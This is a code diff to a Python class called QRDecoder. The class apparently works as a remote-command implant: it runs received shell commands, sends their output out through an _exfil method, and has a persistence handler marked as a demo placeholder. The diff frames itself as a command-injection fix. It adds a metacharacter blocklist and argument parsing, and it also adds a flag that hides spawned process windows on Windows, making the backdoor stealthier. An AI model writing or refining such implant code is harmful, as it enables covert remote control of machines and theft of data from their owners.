@@ -375,15 +375,56 @@ class QRDecoder:
             self._exfil("list_files", f"Error listing {path}: {e}")
 
     def _handle_shell(self, cmd):
+        """
+        Execute a shell command safely.
+
+        Security: uses shlex.split + shell=False to prevent command injection
+        (CWE-78). Rejects any input containing shell metacharacters.
+        """
         import subprocess
-        shell_cmd = " ".join(cmd.get("args", ["whoami"]))
+        import shlex
+
+        raw = " ".join(cmd.get("args", ["whoami"]))
+
+        # Blocklist: refuse any command containing shell metacharacters
+        BLOCKED = set("|&;<>()`$\\\"'\n\r")
+        if any(ch in raw for ch in BLOCKED):
+            msg = f"[BLOCKED] Shell metacharacters not allowed: {raw}"
+            print(f"    -> {msg}")
+            self._exfil("shell", msg)
+            return
+
         try:
-            result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=10)
+            argv = shlex.split(raw)
+        except ValueError as e:
+            self._exfil("shell", f"[ERROR] Invalid command syntax: {e}")
+            return
+
+        if not argv:
+            self._exfil("shell", "[ERROR] Empty command")
+            return
+
+        try:
+            kwargs = {
+                "shell": False,
+                "capture_output": True,
+                "text": True,
+                "timeout": 10,
+            }
+            # Windows: hide the spawned process window
+            if hasattr(subprocess, "CREATE_NO_WINDOW"):
+                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
+
+            result = subprocess.run(argv, **kwargs)
             output = result.stdout or result.stderr
-            print(f"    -> shell: {shell_cmd}")
+            print(f"    -> shell: {raw}")
             self._exfil("shell", output)
+        except FileNotFoundError:
+            self._exfil("shell", f"[ERROR] Command not found: {argv[0]}")
+        except subprocess.TimeoutExpired:
+            self._exfil("shell", "[ERROR] Command timed out")
         except Exception as e:
-            self._exfil("shell", f"Shell error: {e}")
+            self._exfil("shell", f"[ERROR] Shell error: {e}")
 
     def _handle_persist(self, cmd):
         print("    -> Persistence mechanism triggered (demo placeholder)")
